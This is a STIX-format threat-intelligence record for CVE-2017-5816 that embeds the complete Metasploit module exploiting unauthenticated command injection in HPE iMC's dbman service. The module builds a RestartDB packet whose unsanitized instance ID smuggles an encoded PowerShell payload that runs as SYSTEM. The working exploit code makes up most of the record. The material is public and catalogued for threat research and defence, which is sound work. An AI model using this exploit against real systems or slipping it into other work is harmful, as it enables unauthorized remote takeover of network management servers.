{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1cbf8d5a-8e4e-4025-8aa9-3e22c39780cb",
    "created": "2024-08-14T16:45:31.941855Z",
    "modified": "2024-08-14T16:45:31.941859Z",
    "name": "HPE iMC dbman RestartDB Unauthenticated RCE",
    "description": " This module exploits a remote command execution vulnerablity in Hewlett Packard Enterprise Intelligent Management Center before version 7.3 E0504P04.  The dbman service allows unauthenticated remote users to restart a user-specified database instance (OpCode 10008), however the instance ID is not sanitized, allowing execution of arbitrary operating system commands as SYSTEM. This service listens on TCP port 2810 by default.  This module has been tested successfully on iMC PLAT v7.2 (E0403) on Windows 7 SP1 (EN).  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/hp_imc_dbman_restartdb_unauth_rce.rb",
            "external_id": "hp_imc_dbman_restartdb_unauth_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-5816"
        },
        {
            "source_name": "reference",
            "url": "https://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-hpesbhf03745en_us"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HPE iMC dbman RestartDB Unauthenticated RCE',\n      'Description'    => %q{\n        This module exploits a remote command execution vulnerablity in\n        Hewlett Packard Enterprise Intelligent Management Center before\n        version 7.3 E0504P04.\n\n        The dbman service allows unauthenticated remote users to restart\n        a user-specified database instance (OpCode 10008), however the\n        instance ID is not sanitized, allowing execution of arbitrary\n        operating system commands as SYSTEM. This service listens on\n        TCP port 2810 by default.\n\n        This module has been tested successfully on iMC PLAT v7.2 (E0403)\n        on Windows 7 SP1 (EN).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'sztivi', # Discovery\n          'Chris Lyne', # Python PoC (@lynerc)\n          'bcoles' # Metasploit\n        ],\n      'References'     =>\n        [\n          ['CVE', '2017-5816'],\n          ['EDB', '43198'],\n          ['ZDI', '17-340'],\n          ['BID', '98469'],\n          ['URL', 'https://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-hpesbhf03745en_us']\n        ],\n      'Platform'       => 'win',\n      'Targets'        => [['Automatic', {}]],\n      'Payload'        => { 'BadChars' => \"\\x00\" },\n      'DefaultOptions' => { 'WfsDelay' => 15 },\n      'Privileged'     => true,\n      'DisclosureDate' => '2017-05-15',\n      'DefaultTarget'  => 0))\n    register_options [Opt::RPORT(2810)]\n  end\n\n  def check\n    # empty RestartDB packet\n    pkt = [10008].pack('N')\n\n    connect\n    sock.put pkt\n    res = sock.get_once\n    disconnect\n\n    # Expected reply:\n    # \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00:08\\x02\\x01\\xFF\\x043Dbman deal msg error, please to see dbman_debug.log\"\n    return CheckCode::Detected if res =~ /dbman/i\n\n    CheckCode::Safe\n  end\n\n  def dbman_msg(db_instance)\n    data = ''\n\n    db_ip = \"#{rand(255)}.#{rand(255)}.#{rand(255)}.#{rand(255)}\"\n    db_type = \"\\x04\" # SQL Server\n    db_sa_username = rand_text_alpha rand(1..5)\n    db_sa_password = rand_text_alpha rand(1..5)\n    ora_db_ins = rand_text_alpha rand(1..5)\n\n    # dbIp\n    data << \"\\x04\"\n    data << [db_ip.length].pack('C')\n    data << db_ip\n\n    # iDBType\n    data << \"\\x02\"\n    data << [db_type.length].pack('C')\n    data << db_type\n\n    # dbInstance\n    data << \"\\x04\"\n    data << \"\\x82\"\n    data << [db_instance.length].pack('n')\n    data << db_instance\n\n    # dbSaUserName\n    data << \"\\x04\"\n    data << [db_sa_username.length].pack('C')\n    data << db_sa_username\n\n    # dbSaPassword\n    data << \"\\x04\"\n    data << [db_sa_password.length].pack('C')\n    data << db_sa_password\n\n    # strOraDbIns\n    data << \"\\x04\"\n    data << [ora_db_ins.length].pack('C')\n    data << ora_db_ins\n\n    data\n  end\n\n  def dbman_restartdb_pkt(db_instance)\n    data = dbman_msg db_instance\n\n    # opcode 10008 (RestartDB)\n    pkt = [10008].pack('N')\n\n    # packet length\n    pkt << \"\\x00\\x00\"\n    pkt << [data.length + 4].pack('n')\n\n    # packet data length\n    pkt << \"\\x30\\x82\"\n    pkt << [data.length].pack('n')\n\n    # packet data\n    pkt << data\n\n    pkt\n  end\n\n  def execute_command(cmd, _opts = {})\n    connect\n    sock.put dbman_restartdb_pkt \"\\\"& #{cmd} &\"\n    disconnect\n  end\n\n  def exploit\n    command = cmd_psh_payload(\n      payload.encoded,\n      payload_instance.arch.first,\n      { :remove_comspec => true, :encode_final_payload => true }\n    )\n\n    if command.length > 8000\n      fail_with Failure::BadConfig, \"#{peer} - The selected payload is too long to execute through Powershell in one command\"\n    end\n\n    print_status \"Sending payload (#{command.length} bytes)...\"\n    execute_command command\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-05-15",
    "x_mitre_platforms": [
        "win'"
    ]
}